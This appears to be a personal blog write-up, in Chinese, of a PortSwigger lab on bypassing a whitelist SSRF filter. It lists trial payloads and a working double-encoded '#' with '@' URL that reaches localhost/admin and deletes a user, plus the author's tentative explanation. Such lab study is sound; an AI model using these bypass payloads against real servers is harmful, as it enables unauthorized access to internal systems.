---
layout: post
title: "SSRF with whitelist-based input filter"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SSRF
author: ""
tags: ['PortSwigger_Lab', 'SSRF']
---





# SSRF with whitelist-based input filter


好文:
ip變形
https://cht.chowdera.com/2022/195/202207141258177652.html

https://ithelp.ithome.com.tw/articles/10245403?sc=iThelpR

https://moy.cat/2018/10/%E5%86%B7%E7%9F%A5%E8%AF%86%EF%BC%9Aip-%E5%9C%B0%E5%9D%80%E7%9A%84-n-%E7%A7%8D%E5%86%99%E6%B3%95/


double url encode :
https://owasp.org/www-community/Double_Encoding#:~:text=A%20double%20encoded%20URL%20can,no%20mechanisms%20to%20improve%20detection.


```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass. 




該實驗室具有庫存檢查功能，可從內部系統獲取數據。

為解決實驗室問題，更改庫存檢查 URL 以訪問 http://localhost/admin 的管理界面並刪除用戶 carlos。

開發人員已經部署了您需要繞過的反 SSRF 防禦。

```



BP 
```http

POST /product/stock HTTP/1.1
Host: 0ad000fb037c2182c022a3da00a00059.web-security-academy.net
Cookie: session=xvm2b4iB3kLr7JinnV7XBgGRw5TvM92H
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ad000fb037c2182c022a3da00a00059.web-security-academy.net/product?productId=4
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0ad000fb037c2182c022a3da00a00059.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D1

```


```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=4&storeId=1
```

```

http://localhost
External stock check host must be stock.weliketoshop.net"



http://127.0.0.1
External stock check host must be stock.weliketoshop.net"




http://2130706433
"External stock check host must be stock.weliketoshop.net"



http://stock.weliketoshop.net
可跳出畫面，但是是錯勿畫面，這一步告知我們stock.weliketoshop.net 是可以取得response data的



```


@繞過

```
@
https://translate.google.com.tw@127.0.0.1
最後會忽略前面的https://translate.google.com.tw




URL路徑中使用#，為url錨點或片段(錨點後不會傳給後端)
http://localhost#@stock.weliketoshop.net
失敗



url encode #繞過
http://localhost%23@stock.weliketoshop.net
失敗




http://localhost%25%32%33@stock.weliketoshop.net
可以彈出畫面了但不是我們要的畫面


```



解釋:
```
http://localhost%25%32%33@stock.weliketoshop.net



1.利用@忽略前面的http://localhost%25%32%33，所以輸入值 = stock.weliketoshop.net
別忘了實際上http://localhost%25%32%33還在。(所以可以被white list 接受)



2.關鍵錨點#此時被double encode 後端的檢查把它 decode 一次為 %23 ，所以得到
http://localhost%23@stock.weliketoshop.net



3.全部檢查轉換完後，把url拿去請求伺服器
http://localhost%23@stock.weliketoshop.net 



4.server 解析 url decode 
http://localhost#@stock.weliketoshop.net



5.發現錨點# 因此後面@stock.weliketoshop.net被當成錨點
真正 host = http://localhost




```


### 理解後可以真正填上路徑，但有個坑(不確定)
```

照理說/admin應該是擺在前，但會失敗

http://localhost/admin%25%32%33@stock.weliketoshop.net

"External stock check host must be stock.weliketoshop.net"


///////////////////////////////////////////////////////////////////////////////




double url encode /admin


http://localhost%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%33@stock.weliketoshop.net

有response 但是畫面跟 http://localhost 一樣



///////////////////////////////////////////////////////////////////////////////



/admin擺在後就會成功

http://localhost%25%32%33@stock.weliketoshop.net/admin





```


### 得到:
```
<a href="/admin/delete?username=carlos">Delete</a>
```

```
http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
```

### 成功






### 擺在後就會成功，可能是它會有路徑拼接檢查的功能，但我不知道規則
```
http://localhost%25%32%33@stock.weliketoshop.net/admin


猜測:


1.利用@忽略前面的http://localhost%25%32%33，
host = http://localhost%25%32%33@stock.weliketoshop.net
path = /admin




2.關鍵錨點#此時被double encode 後端的檢查把它 decode 一次為 %23 ，所以得到
host =http://localhost%23@stock.weliketoshop.net
path = /admin





3.全部檢查轉換完後，把host拿去請求伺服器 帶上參數 path
host = http://localhost%23@stock.weliketoshop.net
path = /admin



4.server 解析 host 
host = http://localhost#@stock.weliketoshop.net
path = /admin



5.發現錨點# 因此後面@stock.weliketoshop.net被當成錨點
host = http://localhost
path = /admin



6.拼接並請求

http://localhost/admin



```

